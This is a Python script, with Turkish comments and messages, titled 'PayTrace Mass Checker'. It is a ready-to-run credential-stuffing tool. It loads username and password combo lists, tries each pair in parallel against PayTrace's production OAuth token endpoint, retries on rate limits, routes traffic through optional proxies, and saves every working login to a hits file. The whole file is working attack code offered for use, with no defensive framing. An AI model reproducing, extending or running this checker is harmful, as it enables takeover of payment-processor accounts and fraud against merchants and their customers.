"""
PayTrace Mass Checker (Token API)
OAuth 2.0 password grant - toplu username password kontrolü.

Dosya formatı (her satırda):
  user pass
  user:pass
  user|pass
"""

import requests
import sys
import argparse
import json
import threading
import time
import os
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYTRACE_TOKEN_URL = "https://api.paytrace.com/oauth/token"
PAYTRACE_SANDBOX_TOKEN_URL = "https://api.sandbox.paytrace.com/oauth/token"

lock = threading.Lock()
stats = {"valid": 0, "invalid": 0, "error": 0, "checked": 0, "total": 0}
verbose_mode = False


def log_verbose(msg):
    if verbose_mode:
        with lock:
            print(f"\n  \033[90m[DEBUG] {msg}\033[0m", end="")


def get_token(username: str, password: str, sandbox: bool = False,
              timeout: int = 30, proxy: str = None) -> dict:
    url = PAYTRACE_SANDBOX_TOKEN_URL if sandbox else PAYTRACE_TOKEN_URL
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
    }
    proxies = {"https": proxy, "http": proxy} if proxy else None

    try:
        log_verbose(f"POST {url} user={username}")
        resp = requests.post(url, headers=headers, data=data,
                             timeout=timeout, proxies=proxies, verify=True)
        log_verbose(f"HTTP {resp.status_code} user={username}")

        try:
            body = resp.json()
        except Exception:
            return {
                "status_code": resp.status_code,
                "error": f"HTTP {resp.status_code} - yanit JSON degil",
                "raw": resp.text[:200],
            }

        return {"status_code": resp.status_code, "body": body}

    except requests.exceptions.SSLError as e:
        return {"status_code": None, "error": f"SSL hatasi: {e}"}
    except requests.exceptions.ProxyError as e:
        return {"status_code": None, "error": f"Proxy hatasi: {e}"}
    except requests.exceptions.Timeout:
        return {"status_code": None, "error": "Zaman asimi (timeout)"}
    except requests.exceptions.ConnectionError as e:
        err_str = str(e)
        if "NameResolutionError" in err_str or "getaddrinfo" in err_str:
            return {"status_code": None, "error": "DNS hatasi - sunucu adresi cozulemedi"}
        if "Connection refused" in err_str:
            return {"status_code": None, "error": "Baglanti reddedildi"}
        return {"status_code": None, "error": f"Baglanti hatasi: {err_str[:150]}"}
    except Exception as e:
        return {"status_code": None, "error": f"Beklenmeyen hata: {type(e).__name__}: {e}"}


def check_one(username: str, password: str, sandbox: bool = False,
              retries: int = 2, timeout: int = 30, proxy: str = None) -> dict:
    last_error = ""
    for attempt in range(retries + 1):
        result = get_token(username, password, sandbox=sandbox,
                           timeout=timeout, proxy=proxy)

        if result.get("error"):
            last_error = result["error"]
            if attempt < retries:
                wait = 2 * (attempt + 1)
                log_verbose(f"Retry {attempt+1}/{retries} bekleme={wait}s user={username}")
                time.sleep(wait)
                continue
            return {
                "user": username, "pass": password,
                "status": "ERROR",
                "detail": last_error,
                "http_code": result.get("status_code", "-"),
            }

        status_code = result["status_code"]
        body = result.get("body", {})

        if status_code == 200 and "access_token" in body:
            return {
                "user": username, "pass": password,
                "status": "HIT",
                "token": body["access_token"],
                "token_type": body.get("token_type", "Bearer"),
                "expires_in": body.get("expires_in", ""),
            }

        if status_code == 429:
            if attempt < retries:
                wait = 5 * (attempt + 1)
                log_verbose(f"Rate limit! bekleme={wait}s user={username}")
                time.sleep(wait)
                continue
            return {
                "user": username, "pass": password,
                "status": "ERROR",
                "detail": "Rate limit (429) - cok fazla istek, thread azalt",
                "http_code": 429,
            }

        error_msg = body.get("error_description",
                    body.get("error",
                    body.get("message", str(body))))

        return {
            "user": username, "pass": password,
            "status": "BAD",
            "detail": error_msg,
            "http_code": status_code,
        }

    return {
        "user": username, "pass": password,
        "status": "ERROR",
        "detail": last_error or "Max retries",
        "http_code": "-",
    }


def parse_line(line: str):
    """user pass / user:pass / user|pass formatlarını parse et."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    for sep in [":", "|", " ", "\t"]:
        if sep in line:
            parts = line.split(sep, 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                return parts[0].strip(), parts[1].strip()

    return None


def load_combos(filepath: str) -> list[tuple[str, str]]:
    combos = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            parsed = parse_line(line)
            if parsed:
                combos.append(parsed)
    return combos


def progress_bar():
    with lock:
        done = stats["checked"]
        total = stats["total"]
        hits = stats["valid"]
        bad = stats["invalid"]
        err = stats["error"]

    if total == 0:
        return

    pct = done / total * 100
    bar_len = 30
    filled = int(bar_len * done / total)
    bar = "█" * filled + "░" * (bar_len - filled)

    sys.stdout.write(
        f"\r  [{bar}] {pct:5.1f}%  "
        f"Checked: {done}/{total}  "
        f"\033[92mHits: {hits}\033[0m  "
        f"\033[91mBad: {bad}\033[0m  "
        f"\033[93mErr: {err}\033[0m  "
    )
    sys.stdout.flush()


def worker(username, password, sandbox, hits_file, retries, timeout, proxy):
    res = check_one(username, password, sandbox=sandbox,
                    retries=retries, timeout=timeout, proxy=proxy)

    with lock:
        stats["checked"] += 1
        if res["status"] == "HIT":
            stats["valid"] += 1
            if hits_file:
                with open(hits_file, "a") as f:
                    f.write(f"{res['user']} {res['pass']}\n")
        elif res["status"] == "BAD":
            stats["invalid"] += 1
        else:
            stats["error"] += 1

    progress_bar()
    return res


def print_hit(res: dict):
    token_preview = res["token"][:24] + "..." if len(res["token"]) > 24 else res["token"]
    print(
        f"\n  \033[92m[HIT]\033[0m {res['user']} {res['pass']}  "
        f"token={token_preview}  expires={res['expires_in']}s"
    )


def print_error(res: dict):
    http = res.get("http_code", "")
    http_str = f" (HTTP {http})" if http and http != "-" else ""
    print(
        f"\n  \033[93m[ERROR]\033[0m {res['user']} {res['pass']}{http_str}"
        f"  -> {res.get('detail', 'Bilinmeyen hata')}"
    )


def test_connection(sandbox: bool = False, proxy: str = None, timeout: int = 10):
    """API'ye baglanti testi yap."""
    url = PAYTRACE_SANDBOX_TOKEN_URL if sandbox else PAYTRACE_TOKEN_URL
    base_url = url.rsplit("/", 2)[0]
    proxies = {"https": proxy, "http": proxy} if proxy else None

    print(f"  Test     : {base_url}")
    try:
        resp = requests.get(base_url, timeout=timeout, proxies=proxies,
                            verify=True, allow_redirects=True)
        print(f"  Durum    : \033[92mBaglanti OK (HTTP {resp.status_code})\033[0m")
        return True
    except requests.exceptions.SSLError:
        print(f"  Durum    : \033[91mSSL HATASI - sertifika dogrulanamadi\033[0m")
        print(f"  Cozum    : VPN/proxy kapatmayi dene")
        return False
    except requests.exceptions.ProxyError:
        print(f"  Durum    : \033[91mPROXY HATASI - proxy calismadi\033[0m")
        return False
    except requests.exceptions.ConnectionError:
        print(f"  Durum    : \033[91mBAGLANTI HATASI - sunucuya ulasilamadi\033[0m")
        print(f"  Cozum    : Internet baglantini kontrol et, VPN dene")
        return False
    except requests.exceptions.Timeout:
        print(f"  Durum    : \033[91mZAMAN ASIMI - sunucu yanitlamadi\033[0m")
        print(f"  Cozum    : --timeout degerini artir veya VPN dene")
        return False
    except Exception as e:
        print(f"  Durum    : \033[91mHATA: {e}\033[0m")
        return False


def main():
    global verbose_mode

    parser = argparse.ArgumentParser(
        description="PayTrace Mass Checker (Token API)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Kullanım:
  python paytrace_checker.py -f combo.txt
  python paytrace_checker.py -f combo.txt -t 10 --sandbox
  python paytrace_checker.py -f combo.txt -t 5 -o hits.txt
  python paytrace_checker.py -f combo.txt --proxy socks5://127.0.0.1:1080
  python paytrace_checker.py -u admin -p test123 --verbose
  python paytrace_checker.py --test

combo.txt formatı (her satırda):
  user pass
  user:pass
  user|pass
        """,
    )

    parser.add_argument("-f", "--file", help="Combo dosyası (user pass / user:pass / user|pass)")
    parser.add_argument("-u", "--username", help="Tek kullanıcı adı")
    parser.add_argument("-p", "--password", help="Tek şifre")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Thread sayısı (varsayılan: 3)")
    parser.add_argument("-o", "--output", help="Hit sonuçlarını kaydet (varsayılan: hits_<tarih>.txt)")
    parser.add_argument("--retries", type=int, default=2, help="Hata durumunda tekrar deneme (varsayılan: 2)")
    parser.add_argument("--sandbox", action="store_true", help="Sandbox ortamı kullan")
    parser.add_argument("--json", action="store_true", dest="json_output", help="Sonuçları JSON olarak yazdır")
    parser.add_argument("--timeout", type=int, default=30, help="İstek zaman aşımı saniye (varsayılan: 30)")
    parser.add_argument("--proxy", help="Proxy adresi (ornek: socks5://127.0.0.1:1080 veya http://ip:port)")
    parser.add_argument("--verbose", action="store_true", help="Detaylı hata/debug çıktısı göster")
    parser.add_argument("--test", action="store_true", help="Sadece bağlantı testi yap")

    args = parser.parse_args()
    verbose_mode = args.verbose

    env = "SANDBOX" if args.sandbox else "PRODUCTION"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print()
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║      PayTrace Mass Checker (Token API)       ║")
    print("  ╚══════════════════════════════════════════════╝")
    print(f"  Ortam    : {env}")
    print(f"  Tarih    : {now}")
    if args.proxy:
        print(f"  Proxy    : {args.proxy}")

    if args.test:
        print("  " + "─" * 46)
        test_connection(sandbox=args.sandbox, proxy=args.proxy, timeout=args.timeout)
        print()
        return

    if not args.username and not args.file:
        parser.error("-f (dosya) veya -u/-p (tek kontrol) gerekli. Baglanti testi icin --test kullan.")
    if args.username and not args.password:
        parser.error("-u verildiginde -p de gerekli")

    print("  " + "─" * 46)
    print("  Baglanti testi...", end=" ")
    conn_ok = test_connection(sandbox=args.sandbox, proxy=args.proxy, timeout=args.timeout)
    if not conn_ok:
        print("\n  \033[91mBaglanti basarisiz! Devam edilemiyor.\033[0m")
        print("  Cozum onerileri:")
        print("    1. Internet baglantini kontrol et")
        print("    2. VPN veya proxy dene: --proxy socks5://127.0.0.1:1080")
        print("    3. --sandbox ile sandbox ortamini dene")
        print("    4. --verbose ile detayli hata gor")
        print()
        sys.exit(1)
    print("  " + "─" * 46)

    if args.file:
        combos = load_combos(args.file)
        if not combos:
            print("  \033[91mDosyada gecerli combo bulunamadi.\033[0m")
            print("  Format: her satirda  user pass  veya  user:pass")
            sys.exit(1)

        hits_file = args.output or f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        print(f"  Dosya    : {args.file}")
        print(f"  Combo    : {len(combos)}")
        print(f"  Thread   : {args.threads}")
        print(f"  Hits     : {hits_file}")
        print("  " + "─" * 46)

        stats["total"] = len(combos)
        all_results = []

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {
                pool.submit(worker, u, p, args.sandbox, hits_file,
                            args.retries, args.timeout, args.proxy): (u, p)
                for u, p in combos
            }
            for future in as_completed(futures):
                res = future.result()
                all_results.append(res)
                if res["status"] == "HIT":
                    print_hit(res)
                elif res["status"] == "ERROR" and verbose_mode:
                    print_error(res)

        print("\n")
        print("  " + "─" * 46)
        print(f"  \033[1mSONUC\033[0m")
        print(f"  Toplam   : {stats['total']}")
        print(f"  \033[92mHit      : {stats['valid']}\033[0m")
        print(f"  \033[91mBad      : {stats['invalid']}\033[0m")
        print(f"  \033[93mError    : {stats['error']}\033[0m")

        if stats["error"] > 0 and not verbose_mode:
            print(f"\n  \033[93mHata detaylari icin --verbose ekle\033[0m")

        if stats["error"] > 0:
            errors = [r for r in all_results if r["status"] == "ERROR"]
            error_types = {}
            for e in errors:
                detail = e.get("detail", "?")
                error_types[detail] = error_types.get(detail, 0) + 1
            print(f"\n  Hata dagilimi:")
            for detail, count in error_types.items():
                print(f"    {count}x  {detail}")

        if stats["valid"] > 0:
            print(f"\n  \033[92mHitler kaydedildi -> {hits_file}\033[0m")

        if args.json_output:
            safe = []
            for r in all_results:
                entry = dict(r)
                if "token" in entry:
                    entry["token"] = entry["token"][:24] + "..."
                safe.append(entry)
            print("\n" + json.dumps(safe, indent=2, ensure_ascii=False))

    else:
        print(f"  Kullanici: {args.username}")
        print("  " + "─" * 46)

        res = check_one(args.username, args.password, sandbox=args.sandbox,
                        retries=args.retries, timeout=args.timeout, proxy=args.proxy)

        if res["status"] == "HIT":
            print_hit(res)
        elif res["status"] == "BAD":
            http = res.get("http_code", "")
            http_str = f" (HTTP {http})" if http else ""
            print(f"\n  \033[91m[BAD]\033[0m {res['user']} {res['pass']}{http_str}"
                  f"  -> {res.get('detail', '')}")
        else:
            print_error(res)

        if args.json_output:
            entry = dict(res)
            if "token" in entry:
                entry["token"] = entry["token"][:24] + "..."
            print("\n" + json.dumps(entry, indent=2, ensure_ascii=False))

    print()


if __name__ == "__main__":
    main()
